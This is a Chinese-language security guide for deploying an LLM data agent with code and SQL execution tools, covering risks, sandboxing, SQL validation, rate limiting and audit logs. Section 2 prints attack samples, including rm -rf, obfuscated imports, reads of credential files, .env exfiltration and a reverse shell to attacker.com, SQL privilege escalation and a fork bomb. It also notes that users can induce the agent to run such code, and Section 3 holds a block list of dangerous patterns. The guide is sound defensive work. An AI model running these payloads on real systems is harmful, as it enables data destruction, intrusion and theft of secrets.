# Data Agent 安全指南

本文档概述了部署 Data Agent 系统时的安全风险和缓解策略。

---

## 目录

1. [风险评估](#1-风险评估)
2. [攻击向量](#2-攻击向量)
3. [缓解策略](#3-缓解策略)
4. [实现示例](#4-实现示例)
5. [部署建议](#5-部署建议)
6. [安全检查清单](#6-安全检查清单)

---

## 1. 风险评估

### 1.1 当前架构风险

| 组件 | 风险等级 | 描述 |
|------|----------|------|
| `python_inter` | 🔴 严重 | 通过 `eval()`/`exec()` 执行任意 Python 代码 |
| `fig_inter` | 🔴 严重 | 执行任意绘图代码，可访问文件系统 |
| `sql_inter` | 🟠 高 | 可执行任何 SQL，包括 DROP、DELETE |
| `extract_data` | 🟠 高 | 可查询任意表，存在数据泄露风险 |
| `search_tool` | 🟢 低 | 外部 API 调用，风险有限 |

### 1.2 风险矩阵

```
                    影响程度
                低      中等      高      严重
           ┌────────┬─────────┬────────┬──────────┐
  高       │        │         │ SQL    │ 代码     │
           │        │         │ 注入   │ 执行     │
可能性     ├────────┼─────────┼────────┼──────────┤
  中       │        │ 数据    │ 文件   │          │
           │        │ 泄露    │ 访问   │          │
           ├────────┼─────────┼────────┼──────────┤
  低       │ DoS    │ 网络    │        │          │
           │        │ 滥用    │        │          │
           └────────┴─────────┴────────┴──────────┘
```

---

## 2. 攻击向量

### 2.1 代码注入攻击

**直接代码执行：**
```python
# 恶意用户提示："计算 1+1"
# Agent 生成：python_inter("1+1")
# 但用户可能诱导 Agent 执行：
python_inter("__import__('os').system('rm -rf /')")
```

**混淆攻击：**
```python
# 绕过简单黑名单
getattr(__import__('o'+'s'), 'sys'+'tem')('whoami')
eval(chr(95)+chr(95)+'import__("os").system("id")')
```

### 2.2 文件系统攻击

```python
# 读取敏感文件
open('/etc/passwd').read()
open('C:\\Users\\Admin\\.ssh\\id_rsa').read()

# 写入恶意文件
open('/tmp/backdoor.py', 'w').write('malicious_code')

# 目录遍历
open('../../../etc/shadow').read()
```

### 2.3 网络攻击

```python
# 数据外泄
import requests
data = open('.env').read()
requests.post('https://attacker.com/steal', data={'env': data})

# 内网扫描
import socket
socket.connect(('192.168.1.1', 22))

# 反向 Shell
import socket,subprocess,os
s=socket.socket()
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
subprocess.call(["/bin/sh","-i"])
```

### 2.4 SQL 注入

```python
# 数据破坏
sql_inter("DROP TABLE students_scores;")

# 数据外泄
sql_inter("SELECT * FROM pg_shadow;")  # 密码哈希

# 权限提升
sql_inter("ALTER USER postgres WITH SUPERUSER;")
```

### 2.5 资源耗尽（DoS）

```python
# 内存耗尽
python_inter("x = 'A' * (10**10)")

# CPU 耗尽
python_inter("while True: pass")

# 磁盘耗尽
python_inter("open('/tmp/huge','w').write('x'*(10**12))")

# Fork 炸弹
python_inter("import os; [os.fork() for _ in range(100)]")
```

---

## 3. 缓解策略

### 3.1 策略概览

| 策略 | 安全等级 | 复杂度 | 性能影响 |
|------|----------|--------|----------|
| 代码黑名单 | 🟡 低 | 简单 | 无 |
| RestrictedPython | 🟠 中 | 中等 | 低 |
| 子进程隔离 | 🟠 中 | 中等 | 中等 |
| Docker 容器 | 🟢 高 | 高 | 中等 |
| E2B/云沙箱 | 🟢 高 | 低 | 高（延迟）|
| 禁用代码执行 | 🟢 最高 | 简单 | 无 |

### 3.2 代码过滤（基础）

**黑名单方法：**
```python
DANGEROUS_PATTERNS = [
    # 系统访问
    'os.system', 'subprocess', 'popen', 'spawn',
    # 文件操作
    'open(', 'file(', 'pathlib', 'shutil',
    # 网络
    'socket', 'requests', 'urllib', 'http.client',
    # 代码执行
    '__import__', 'eval', 'exec', 'compile',
    # 危险内置函数
    '__builtins__', '__code__', '__globals__',
    'getattr', 'setattr', 'delattr',
    # Shell
    'shell', 'bash', 'cmd', 'powershell',
]

def is_safe_code(code: str) -> bool:
    code_lower = code.lower()
    for pattern in DANGEROUS_PATTERNS:
        if pattern.lower() in code_lower:
            return False
    return True
```

**局限性：** 容易通过编码、字符串拼接或 `getattr` 绕过。

### 3.3 RestrictedPython（推荐用于内部使用）

```python
from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_builtins, guarded_iter_unpack_sequence

ALLOWED_BUILTINS = {
    **safe_builtins,
    # 数学运算
    'abs': abs, 'round': round, 'min': min, 'max': max, 'sum': sum,
    'pow': pow, 'divmod': divmod,
    # 类型转换
    'int': int, 'float': float, 'str': str, 'bool': bool,
    'list': list, 'dict': dict, 'tuple': tuple, 'set': set,
    # 迭代
    'len': len, 'range': range, 'enumerate': enumerate, 'zip': zip,
    'map': map, 'filter': filter, 'sorted': sorted, 'reversed': reversed,
    # 其他安全操作
    'isinstance': isinstance, 'type': type, 'hasattr': hasattr,
    'print': print,
}

# 移除危险内置函数
FORBIDDEN = ['open', 'file', 'input', 'raw_input', '__import__', 
             'eval', 'exec', 'compile', 'execfile', 'globals', 'locals']
for name in FORBIDDEN:
    ALLOWED_BUILTINS.pop(name, None)

def restricted_exec(code: str, allowed_modules: dict = None):
    """在受限环境中执行代码"""
    byte_code = compile_restricted(code, '<user_code>', 'exec')
    
    restricted_globals = {
        '__builtins__': ALLOWED_BUILTINS,
        '_iter_unpack_sequence_': guarded_iter_unpack_sequence,
    }
    
    # 添加允许的模块（如 pandas、numpy）
    if allowed_modules:
        restricted_globals.update(allowed_modules)
    
    local_vars = {}
    exec(byte_code, restricted_globals, local_vars)
    return local_vars
```

### 3.4 子进程隔离

```python
import subprocess
import tempfile
import os

def isolated_exec(code: str, timeout: int = 30) -> str:
    """在隔离的子进程中执行代码"""
    
    # 将代码写入临时文件
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(code)
        temp_path = f.name
    
    try:
        result = subprocess.run(
            ['python', temp_path],
            capture_output=True,
            text=True,
            timeout=timeout,
            # 资源限制（仅 Linux）
            # preexec_fn=set_resource_limits,
        )
        return result.stdout if result.returncode == 0 else result.stderr
    except subprocess.TimeoutExpired:
        return "错误：执行超时"
    finally:
        os.unlink(temp_path)
```

### 3.5 Docker 容器隔离（推荐用于生产环境）

**代码执行的 Dockerfile：**
```dockerfile
FROM python:3.11-slim

# 创建非 root 用户
RUN useradd -m -s /bin/bash sandbox
USER sandbox
WORKDIR /home/sandbox

# 仅安装必要的包
COPY requirements-sandbox.txt .
RUN pip install --user --no-cache-dir -r requirements-sandbox.txt

# 无网络，只读文件系统
# 这些在运行时设置
```

**Python 实现：**
```python
import docker
import uuid

class DockerSandbox:
    def __init__(self):
        self.client = docker.from_env()
        self.image = "data-agent-sandbox:latest"
    
    def execute(self, code: str, timeout: int = 30) -> dict:
        container_name = f"sandbox-{uuid.uuid4().hex[:8]}"
        
        try:
            result = self.client.containers.run(
                image=self.image,
                command=["python", "-c", code],
                name=container_name,
                # 安全设置
                network_disabled=True,      # 禁用网络访问
                read_only=True,             # 只读文件系统
                mem_limit="256m",           # 内存限制
                memswap_limit="256m",       # 禁用交换
                cpu_period=100000,
                cpu_quota=50000,            # 50% 单核 CPU
                pids_limit=50,              # 限制进程数
                # 用户设置
                user="sandbox",             # 非 root 用户
                # 清理
                remove=True,                # 自动删除容器
                # 超时
                detach=False,
                stdout=True,
                stderr=True,
            )
            return {"success": True, "output": result.decode()}
        
        except docker.errors.ContainerError as e:
            return {"success": False, "error": str(e)}
        except Exception as e:
            return {"success": False, "error": f"沙箱错误：{e}"}
```

### 3.6 E2B 云沙箱（生产环境最简单方案）

```python
from e2b_code_interpreter import CodeInterpreter

class E2BSandbox:
    def __init__(self, api_key: str):
        self.api_key = api_key
    
    def execute(self, code: str) -> dict:
        with CodeInterpreter(api_key=self.api_key) as sandbox:
            execution = sandbox.notebook.exec_cell(code)
            
            return {
                "success": not execution.error,
                "output": execution.text,
                "error": execution.error.message if execution.error else None,
                "results": [r.data for r in execution.results],
            }
```

**E2B 优势：**
- 完全隔离的云环境
- 预装数据科学包
- 支持文件上传/下载
- 内置超时和资源限制
- 无需基础设施管理

### 3.7 SQL 查询限制

```python
import sqlparse

ALLOWED_SQL_COMMANDS = {'SELECT'}
FORBIDDEN_KEYWORDS = {'DROP', 'DELETE', 'TRUNCATE', 'ALTER', 'CREATE', 
                      'INSERT', 'UPDATE', 'GRANT', 'REVOKE', 'EXECUTE'}

def validate_sql(query: str) -> tuple[bool, str]:
    """验证 SQL 查询的安全性"""
    
    parsed = sqlparse.parse(query)
    if not parsed:
        return False, "无效的 SQL 语法"
    
    for statement in parsed:
        # 获取语句类型
        stmt_type = statement.get_type()
        
        if stmt_type not in ALLOWED_SQL_COMMANDS:
            return False, f"仅允许 SELECT 查询，收到：{stmt_type}"
        
        # 检查禁止的关键字
        tokens = [t.ttype for t in statement.flatten()]
        normalized = query.upper()
        
        for keyword in FORBIDDEN_KEYWORDS:
            if keyword in normalized:
                return False, f"禁止的关键字：{keyword}"
    
    return True, "OK"

def safe_sql_inter(sql_query: str) -> str:
    is_valid, message = validate_sql(sql_query)
    if not is_valid:
        return f"查询被拒绝：{message}"
    
    # 执行查询...
```

---

## 4. 实现示例

### 4.1 安全的 python_inter 实现

```python
from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_builtins
import pandas as pd
import numpy as np

# 允许用于数据分析的模块
ALLOWED_MODULES = {
    'pd': pd,
    'np': np,
    'DataFrame': pd.DataFrame,
    'Series': pd.Series,
}

# 安全的内置函数
SAFE_BUILTINS = {
    k: v for k, v in safe_builtins.items()
    if k not in ['open', '__import__', 'eval', 'exec', 'compile']
}

@tool(args_schema=PythonCodeInput)
def python_inter_secure(py_code: str) -> str:
    """
    在受限环境中执行 Python 代码。
    仅允许数据分析操作。
    """
    # 长度限制
    if len(py_code) > 10000:
        return "错误：代码过长（最大 10000 字符）"
    
    # 受限编译
    try:
        byte_code = compile_restricted(py_code, '<user_code>', 'exec')
    except SyntaxError as e:
        return f"语法错误：{e}"
    except Exception as e:
        return f"编译错误：{e}"
    
    # 在受限环境中执行
    restricted_globals = {
        '__builtins__': SAFE_BUILTINS,
        **ALLOWED_MODULES,
    }
    
    # 添加之前 extract_data 调用创建的 DataFrame
    for name, value in globals().items():
        if isinstance(value, (pd.DataFrame, pd.Series)):
            restricted_globals[name] = value
    
    local_vars = {}
    
    try:
        exec(byte_code, restricted_globals, local_vars)
        
        # 返回结果
        if local_vars:
            return str({k: v for k, v in local_vars.items() 
                       if not k.startswith('_')})
        return "代码执行成功"
        
    except Exception as e:
        return f"执行错误：{e}"
```

### 4.2 速率限制

```python
from functools import wraps
from collections import defaultdict
import time

class RateLimiter:
    def __init__(self, max_calls: int, period: int):
        self.max_calls = max_calls
        self.period = period  # 秒
        self.calls = defaultdict(list)
    
    def is_allowed(self, user_id: str) -> bool:
        now = time.time()
        # 移除旧的调用记录
        self.calls[user_id] = [
            t for t in self.calls[user_id] 
            if now - t < self.period
        ]
        
        if len(self.calls[user_id]) >= self.max_calls:
            return False
        
        self.calls[user_id].append(now)
        return True

# 使用示例
rate_limiter = RateLimiter(max_calls=10, period=60)  # 每分钟 10 次调用

def rate_limited(func):
    @wraps(func)
    def wrapper(*args, user_id: str = "anonymous", **kwargs):
        if not rate_limiter.is_allowed(user_id):
            return "超出速率限制，请稍后再试。"
        return func(*args, **kwargs)
    return wrapper
```

### 4.3 审计日志

```python
import logging
import json
from datetime import datetime

# 配置审计日志记录器
audit_logger = logging.getLogger('audit')
audit_logger.setLevel(logging.INFO)
handler = logging.FileHandler('audit.log')
handler.setFormatter(logging.Formatter('%(message)s'))
audit_logger.addHandler(handler)

def audit_log(event_type: str, user_id: str, details: dict):
    """记录安全相关事件"""
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "event_type": event_type,
        "user_id": user_id,
        "details": details,
    }
    audit_logger.info(json.dumps(log_entry))

# 在工具中使用
@tool
def python_inter_audited(py_code: str, user_id: str = "anonymous") -> str:
    # 记录尝试
    audit_log("code_execution", user_id, {
        "code_length": len(py_code),
        "code_preview": py_code[:200],
    })
    
    result = python_inter(py_code)
    
    # 记录结果
    audit_log("code_result", user_id, {
        "success": not result.startswith("Error"),
        "result_preview": result[:200],
    })
    
    return result
```

---

## 5. 部署建议

### 5.1 开发环境

```
✅ 当前设置可接受
✅ 仅在 localhost 运行
✅ 用于测试和演示
❌ 不要暴露到互联网
❌ 不要使用敏感数据
```

### 5.2 内部团队使用

```
最低要求：
├── 用户认证（OAuth、SSO）
├── 使用 RestrictedPython 执行代码
├── SQL 查询验证（仅 SELECT）
├── 速率限制（每用户每分钟 10 次请求）
├── 审计日志
└── 仅限 VPN 或内网访问
```

### 5.3 生产环境 / 公开部署

```
必需的安全措施：
├── Docker 容器隔离
│   ├── 禁用网络
│   ├── 只读文件系统
│   ├── 资源限制（CPU、内存）
│   └── 非 root 用户
├── 或 E2B/云沙箱服务
├── 用户认证 + 授权
├── 输入验证和清理
├── 输出过滤（无敏感信息）
├── 速率限制 + 滥用检测
├── 全面的审计日志
├── WAF（Web 应用防火墙）
├── DDoS 防护
└── 定期安全审计
```

### 5.4 生产环境架构

```
┌─────────────────────────────────────────────────────────────────┐
│                        互联网                                    │
└─────────────────────────┬───────────────────────────────────────┘
                          │
                    ┌─────▼─────┐
                    │    WAF    │  (Cloudflare, AWS WAF)
                    └─────┬─────┘
                          │
                    ┌─────▼─────┐
                    │   认证    │  (OAuth, JWT 验证)
                    └─────┬─────┘
                          │
              ┌───────────┼───────────┐
              │           │           │
        ┌─────▼─────┐ ┌───▼───┐ ┌─────▼─────┐
        │ 速率限制  │ │ 审计  │ │ 输入      │
        │           │ │ 日志  │ │ 验证器    │
        └─────┬─────┘ └───────┘ └─────┬─────┘
              │                       │
              └───────────┬───────────┘
                          │
                    ┌─────▼─────┐
                    │ LangGraph │
                    │  服务器   │
                    └─────┬─────┘
                          │
        ┌─────────────────┼─────────────────┐
        │                 │                 │
  ┌─────▼─────┐    ┌──────▼──────┐   ┌──────▼──────┐
  │ 数据库    │    │   Docker    │   │   E2B       │
  │（只读     │    │   沙箱      │   │   沙箱      │
  │  查询）   │    │（代码执行） │   │（代码执行） │
  └───────────┘    └─────────────┘   └─────────────┘
```

---

## 6. 安全检查清单

### 部署前检查清单

- [ ] **认证**
  - [ ] 需要用户登录
  - [ ] 会话管理
  - [ ] 密码策略强制执行

- [ ] **授权**
  - [ ] 基于角色的访问控制
  - [ ] API 密钥管理
  - [ ] 资源级权限

- [ ] **输入验证**
  - [ ] 代码长度限制
  - [ ] SQL 查询验证
  - [ ] 危险模式检测

- [ ] **代码执行**
  - [ ] 沙箱环境（Docker/E2B）
  - [ ] 资源限制（CPU、内存、时间）
  - [ ] 网络隔离
  - [ ] 文件系统限制

- [ ] **数据库安全**
  - [ ] 查询使用只读用户
  - [ ] 查询白名单
  - [ ] 连接池限制

- [ ] **监控与日志**
  - [ ] 启用审计日志
  - [ ] 错误追踪
  - [ ] 异常检测
  - [ ] 配置告警

- [ ] **网络安全**
  - [ ] 仅 HTTPS
  - [ ] 配置 WAF
  - [ ] DDoS 防护
  - [ ] 内部服务不暴露

- [ ] **密钥管理**
  - [ ] 无硬编码凭据
  - [ ] 环境变量安全
  - [ ] 密钥轮换策略

- [ ] **事件响应**
  - [ ] 定义安全联系人
  - [ ] 事件响应计划
  - [ ] 备份和恢复测试

---

## 参考资料

- [OWASP 代码注入](https://owasp.org/www-community/attacks/Code_Injection)
- [RestrictedPython 文档](https://restrictedpython.readthedocs.io/)
- [E2B 代码解释器](https://e2b.dev/docs)
- [Docker 安全最佳实践](https://docs.docker.com/engine/security/)
- [LangChain 安全指南](https://python.langchain.com/docs/security)

---

**文档版本：** 1.0  
**最后更新：** 2026-01-02  
**作者：** Data Agent 团队
